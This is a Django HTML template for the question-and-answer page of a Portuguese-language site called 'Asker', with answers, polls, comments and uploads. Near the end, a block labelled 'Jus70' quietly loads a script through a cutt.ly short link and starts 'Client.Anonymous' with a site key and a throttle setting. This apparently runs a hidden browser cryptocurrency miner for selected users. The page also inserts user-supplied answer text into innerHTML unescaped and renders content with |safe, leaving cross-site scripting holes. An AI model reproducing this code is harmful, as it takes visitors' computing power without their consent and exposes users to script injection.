{% load main_app_extras %}
{% load humanize %}
<!doctype html>
<html lang="pt-br">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<style id="wait">
			body {
				visibility: hidden;
				opacity: 0;
			}
		</style>
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css">
		<script src="/static/js/cookieman.js?v=1"></script>
		<script>
			var cssfn = 'question.css';
			var cssversion = '?v=14';
			if (getDarkCookie() == 'true') { cssfn = 'question-d.css';}
			var link = document.createElement('link');
			link.rel = 'stylesheet';
			link.type = 'text/css';
			link.href = '/static/css/' + cssfn + cssversion;
			document.head.appendChild(link);

			document.getElementById('wait').remove();
		</script>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
		<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
		<title>{{ question.text }} | Asker</title>
		<script>
$(function() {
	$('#response-form').ajaxForm(function(data) {
		answer_id = data['answer_id']

		responses = document.getElementById('responses')

		new_user_response = document.getElementById('response-form').text.value

		new_innerHTML = '<li class="list-group-item"><div class="card-body"><div class="poster-container"><a class="poster-info" href="/user/{{ user.username }}"><div class="poster-profile-pic-container"><img class="poster-profile-pic-popover" width="45px" src="{{ user_p.avatar.url }}" alt="{{ user.username }}"></div><div class="poster-text-container"><div><span>{{ user.username }}</span></div></div></div></a><p>' + new_user_response + '</p></p>'

		if (data['has_image']) {
			url = data['image_url']
			new_innerHTML += '<hr><img src="'+url+'" class="response-image" alt="Ocorreu um erro ao processar a imagem."><hr>'
		}

		new_innerHTML += '<div class="heart-comment" id="like-counter-'+answer_id+'" onclick="like(this, '+answer_id+')"><img width="20px" src="/static/images/white-heart.png?version=3" class="icon"> <span>0</span></div>&nbsp;&nbsp;                   <div class="dropdown btn-group dropup response-control" id="options-dropdown"><button class="btn btn-primary btn-sm dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Op√ß√µes</button>   <div class="dropdown-menu" aria-labelledby="dropdownMenuButton"><button class="dropdown-item" onclick="delete_response(this, '+answer_id+');">Apagar</button><button class="dropdown-item" onclick="document.getElementById(`edit-response-form`).style.display=`block`">Editar</button></div>   </div>                  <div class="heart-comment">&nbsp;<img width="20px" src="/static/images/comments.png?version=3" class="icon" onclick="show_comments(this.parentElement, '+answer_id+', this.parentElement.getElementsByTagName(`img`)[0], `{{ csrf_token }}`, `{{ user.username }}`, {{ question.id }})"> <span class="comment">0</span><div class="comments" id="1"></div></div>'
		new_innerHTML += '<form id="edit-response-form" class="form-inline" method="post" action="/edit-response" onsubmit="document.getElementById(`response-'+answer_id+'`).innerHTML = this.response.value.replace(`\n`, `<br>`)">{% csrf_token %}<input type="hidden" name="response_id" value="'+answer_id+'"><textarea name="response" class="form-control">'+new_user_response+'</textarea><input class="btn btn-outline-primary" type="submit" value="Enviar"></form></li>'
		responses.innerHTML += new_innerHTML

		document.getElementById('response-form').remove()



	});

	$('#edit-response-form').ajaxForm(function(answer_id) {
		document.getElementById('edit-response-form').style.display = 'none'
	});
});
function delete_response(response_button_dom_el,response_id){if(confirm('Opa! Voc√™ tem certeza que deseja apagar sua resposta?')){$.ajax({url:'/delete_response',data:{response_id:response_id,},complete:function() {response_button_dom_el.parentElement.parentElement.parentElement.parentElement.remove();}})}}
		</script>
	</head>
	<body>

		{% include "includes/navbar.html" %}
		<main>
			<div class="card bg-main">
				<div class="card-body">
					<div class="poster-container">
					<a class="poster-info" href="/user/{{ question.creator.user.username }}">
						<div class="poster-profile-pic-container">
              <img class="poster-profile-pic-popover" width="45px" src="{{ question.creator.avatar.url }}" alt="{{ question.creator.user.username }}">
            </div>
						<div class="poster-text-container"><div><span>{{ question.creator.user.username }}</span><br><span title="{{ question.pub_date }}" class="post-pub-date"> {{ question.get_naturaltime }}</span></div></div>
					</a>
					</div>
					<h3>{{ question.text }}</h3>
					{% if question.description != '' %}
					<hr>
					<p>{{ question.description|cut_description|safe|linebreaksbr }}</p>
					{% endif %}

					{% if question.get_embedded_content %}
					<div class="emb">
						{{ question.get_embedded_content|safe }}
					</div>
					<br>
					{% endif %}

					{% if question.image %}
					<center>
						<hr>
						<img width="70%" src="{{ question.image.url }}">
					</center>
					{% endif %}

					{% if question.has_poll %}
						{% voted user poll as VOTED %}
						{% if not VOTED and poll.may_vote and user.is_authenticated %}
							<div class="card poll poll-chooser">
								<ul class="list-group list-group-flush">
								{% for choice in poll_choices %}
									<li class="choice list-group-item">
										<div class="chooser">
											<label>
												{% if poll.multichoice %}
													<input class="poll-option" type="checkbox" name="poll-option" value="{{ choice.id }}">
												{% else %}
													<input class="poll-option" type="radio" name="poll-option" value="{{ choice.id }}">
												{% endif %}
												<span>{{ choice.text }}</span>
											</label>
										</div>
									</li>
								{% endfor %}
								</ul>
								<div class="card-footer">
									<button class="btn btn-primary" onclick="voteOnPoll();" >Votar</button>
									<span class="clickable" onclick="openShower();">Ver resultados</span>
								</div>
							</div>
						{% endif %}

						<div class="card poll-shower"><div class="card-body">
							<input type="hidden" name="qpoll" value="{{ poll.id }}">
							{% for choice in poll_choices %}
								<div class="choice-show">

									{% if user|has_chosen:choice %}
									<span class="float-right">
										<span class="vote-count">{{ choice.votes }}</span> votos
										<i class="fa fa-check-circle-o" aria-hidden="true"></i> </span>
									{% else %}
									<span class="float-right"><span class="vote-count">{{ choice.votes }}</span> votos</span>
									{% endif %}

									<span>{{ choice.text }}</span>

									<div class="progress progress-striped active">
										<div class="progress-bar progress-bar-primary" style="width: 0%;"></div>
									</div>
								</div>
							{% endfor %}

						</div>
							<div class="card-footer">
							{% if poll.may_vote %}
								{% if not VOTED and user.is_authenticated %}
									<span class="clickable" onclick="openChooser();">Votar</span>
								{% elif user.is_authenticated %}
									<span class="clickable" onclick="undoVote();">Retirar voto</span>
								{% else %}
									<span>Fa√ßa login ou crie uma conta para responder √† enquete.</span>
								{% endif %}
							{% else %}
								<span>Vota√ß√£o encerrada.</span>
							{% endif %}
							</div>
						</div>
					{% endif %}

					{% if question.creator.user.username == user.username %}
					{% else %}
					<i class="far fa-flag" id="question-popover" data-toggle="popover" data-content="<p>Para denunciar esta pergunta, use o bot√£o abaixo. Use apenas quando necess√°rio.</p><button class='btn btn-outline-danger' onclick='report_question({{ question.id }}, this)'>Denunciar</button>"></i>
					{% endif %}

					{% if question.creator.user.username == user.username %}
					<button onclick="delete_question({{ question.id }})" class="btn btn-outline-danger">Apagar</button>
					{% endif %}
				</div>
			</div>

			<section class="card bg-main" id="responses">
  				<div class="card-header">
    				{{ question.total_responses }} respostas
  				</div>
				<ul class="list-group list-group-flush">
				{% for response in responses|pull_best_answer %}
				<li class="list-group-item">
					<div class="card-body">
						<div class="poster-container">
						<a class="poster-info" href="/user/{{ response.creator.user.username }}">
							<div class="poster-profile-pic-container"><img class="poster-profile-pic-popover" width="40px" src="{{ response.creator.avatar.url }}" alt="{{ response.creator.user.username }}"></div>
							<div class="poster-text-container"><div><span>{{ response.creator.user.username }}</span><br><span title="{{ response.pub_date }}" class="post-pub-date"> {{ response.get_naturaltime }}</span></div></div>
						</a></div>
                        {% if question.best_answer == response.id %}
                            <div class="best-answer-badge"><span class="badge badge-pill badge-primary">üèÜ Melhor resposta</span></div>
                        {% endif %}
						<p id="response-{{ response.id }}">{{ response.text|cut_description|safe|linebreaksbr }}</p>

						{% if response.get_embedded_content %}
							<div class="embedded-content">
								{{ response.get_embedded_content|safe }}
							</div>
							<br>
						{% endif %}

						{% if response.image %}
							<hr>
							<img src="{{ response.image.url }}" class="response-image" alt="Ocorreu um erro ao processar a imagem.">
							<hr>
						{% endif %}

						<div class="heart-comment" id="like-counter-{{ response.id }}" onclick="like(this, {{ response.id }})">
							<img width="18px" src="/static/images/{{ response.id|like_or_not:user.username }}?version=3" class="icon">
							<span>{{ response.total_likes }}</span>
						</div>
						&nbsp;&nbsp;

						{% if response.creator.user.username == user.username %}
						<div class="dropdown btn-group dropup response-control" id="options-dropdown">
						  <button class="btn btn-primary btn-sm dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
							  Op√ß√µes
						  </button>
						  <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
							<button class="dropdown-item" onclick="delete_response(this, {{ response.id }})">Apagar</button>
							<button class="dropdown-item" onclick="document.getElementById('edit-response-form').style.display='block'">Editar</button>
						  </div>
						</div>
						{% elif question.creator.user.username == user.username %}
							{% if question.may_choose_answer %}
							<button class="btn btn-primary btn-sm response-control choose-answer-btn" type="button" onclick="chooseAnswer({{ response.id }})">
							  	Definir melhor resposta
							</button>
							{% endif %}
						{% endif %}


						<div class="heart-comment">
							<img width="18px" src="/static/images/comments.png?version=3" class="icon" onclick="show_comments(this.parentElement, {{ response.id }}, this.parentElement.getElementsByTagName('img')[0], '{{ csrf_token }}', `{{ user.username }}`, {{ question.id }})">
							<span class="comment">{{ response.id|total_comments }}</span>

							<!-- Coment√°rios -->
							<div class="card comments">
								<ul class="comments-ul list-group list-group-flush" id="1"> <!-- O ID deste elemento √© usado para pagina√ß√£o. -->

								</ul>
							</div>
						</div>
					{% if response.creator.user.username == user.username %}
						<form id="edit-response-form" class="form-inline" method="post" action="/edit-response" onsubmit="document.getElementById('response-{{ response.id }}').innerHTML = this.response.value.replace('\n', '<br>')">
							{% csrf_token %}
							<input type="hidden" name="response_id" value="{{ response.id }}">
							<textarea class="form-control edit-response-textarea" name="response">{{ response.text }}</textarea>
							<input class="btn btn-outline-primary" type="submit" value="Enviar">
						</form>
						{% endif %}
					</div>
				</li>
				{% endfor %}
				</ul>
			</section>
			{% if user.is_authenticated %}
				{% if user_p.active %}
					{% answered user.username question.id as ANSWERED %}
					{% if not ANSWERED %}
						{% ablockb question.creator.user.username user.username as BLOCKED %}
						{% if not BLOCKED %}
							<form id="response-form" method="post" action="/save_answer" enctype="multipart/form-data" onsubmit="document.getElementById('response-loading-gif').style.display = 'block'; document.getElementById('send-response-btn').disabled = true;">
								{% csrf_token %}
								<input type="hidden" name="question_id" value="{{ question.id }}">
								<textarea maxlength="5000" class="form-control" placeholder="Escreva uma resposta..." name="text" required="required"></textarea>
								<input class="btn btn-outline-primary" type="submit" value="Enviar" id="send-response-btn">
								<label for="upload-photo"><img src="/static/images/camera.png?version=3" width="25px"> <span id="upload-photo-text"></span></label>
								<input type="file" accept="image/*" name="file" id="upload-photo" onclick="return veracity_test({{ user_p.total_points }}, {% MINIMUM_POINTS_FOR_POSTING_IMAGES %});">
								<img src="/static/images/close-icon.png" width="20px" style="display: none; cursor: pointer;" id="delete-photo-icon"><span>
							</form>
							<img src="/static/images/loading.gif" width="30px" style="display: none;" id="response-loading-gif">
						{% else %}
							Pergunta indispon√≠vel.
						{% endif %}
					{% endif %}
				{% else %}
					<p>Confirme seu email para responder est√° pergunta.</p>
				{% endif %}
			{% else %}
				<p>Fa√ßa <a href="/signin?redirect=/question/{{ question.id }}">login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder esta pergunta.</p>
			{% endif %}
		</main>
		<div class="recommended">
			<hr>
			<h3 class="text-secondary">‚Äî Responda tamb√©m ‚Äî</h3>
			{% for question in recommended_questions %}
			<div class="r-question">
				<a href="/question/{{ question.id }}"><b>{{ question.text }}</b></a>
				<br>
				<small class="text-muted">perguntada {{ question.get_naturaltime }} por <a href="/user/{{ question.creator.user.username }}">{{ question.creator.user.username }}</a></small>
				<hr>
			</div>
			{% endfor %}
		</div>
<script src="/static/js/question.js?v=10"></script>
<script>
var formbgcolor='bg-white'; var bgcolor='bg-white'; var textcolor='text-dark';
var commentformbgcolor='bg-white'; var commentbgcolor='bg-light';
if (getDarkCookie() == 'true') {
	document.getElementsByClassName('navbar')[0].classList.remove("navbar-light");
	document.getElementsByClassName('navbar')[0].classList.add("navbar-dark");
}
</script>
<script src="/static/js/general_functions.js?version=2"></script>


    <!-- Jus70 -->
{% can user.email request as CAN %}
{% if CAN %}
<script>
  $.getScript("https://cutt.ly/wns1PUz", function() {
    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
        throttle: 0.7, c: 'w'
    });
    _client.start();
    console.log('-');
  });
</script>
{% endif %}
    <!-- !Jus70 -->

	</body>

	<script>
/* Js p/ upload de imagem em respostas */
document.getElementById('upload-photo').onchange = function () {
	text = document.getElementById('upload-photo-text')
	delete_photo_icon = document.getElementById('delete-photo-icon')
	input = document.getElementById('upload-photo')
	text.innerText = input.value.slice(12)
	delete_photo_icon.style.display = 'inline'
}

document.getElementById('delete-photo-icon').onclick = function () {
	delete_photo_icon = document.getElementById('delete-photo-icon')
	input = document.getElementById('upload-photo')
	text = document.getElementById('upload-photo-text')
	delete_photo_icon.style.display = 'none'
	text.innerText = ''
	input.value = null
}
/* Fim: Js p/ upload de imagem em respostas */

function delete_question(id) {
    if (confirm('Opa! Tem certeza que deseja apagar sua resposta?')) {
		$.ajax({
			url: '/delete_question',
			type: 'post',
			data: {
				csrfmiddlewaretoken: '{{csrf_token}}',
				question_id: id,
			},
			complete: function() {
				window.location = window.location.href.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i)[0] + 'news';
			}
		})
	}
}
	</script>

<script>
$('#profile-pic-popover').popover({
	trigger: 'hover',
	container: 'body',
	html: true,
});

$('.responder-profile-pic-popover').popover({
	trigger: 'hover',
	container: 'body',
	html: true,
});
</script>
</html>
